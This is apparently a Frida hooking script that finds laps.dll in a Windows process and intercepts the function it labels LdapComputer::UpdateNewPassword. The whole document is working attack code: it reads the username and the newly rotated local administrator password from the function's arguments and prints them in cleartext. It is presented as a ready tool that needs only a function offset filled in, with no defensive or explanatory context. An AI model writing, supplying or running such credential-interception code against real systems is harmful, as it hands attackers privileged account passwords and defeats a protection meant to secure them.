const offset = OFFSETVALUE; // Update me - offset to the target function

const moduleName = 'laps.dll';
const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = baseAddr.add(offset);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);   
    console.log(`[+] Hooking function at ${targetFuncAddr} (offset 0x${offset.toString(16)})`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[GET] LdapComputer::UpdateNewPassword');
            
                    const username = args[3].readUtf16String();
                    const password = args[4].readUtf16String();
            
                    console.log(`--> Username (args[3]): ${username} / Password (args[4]): ${password}`);
        },
        onLeave: function (retval) {
            // No operation
        }
    });

} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}
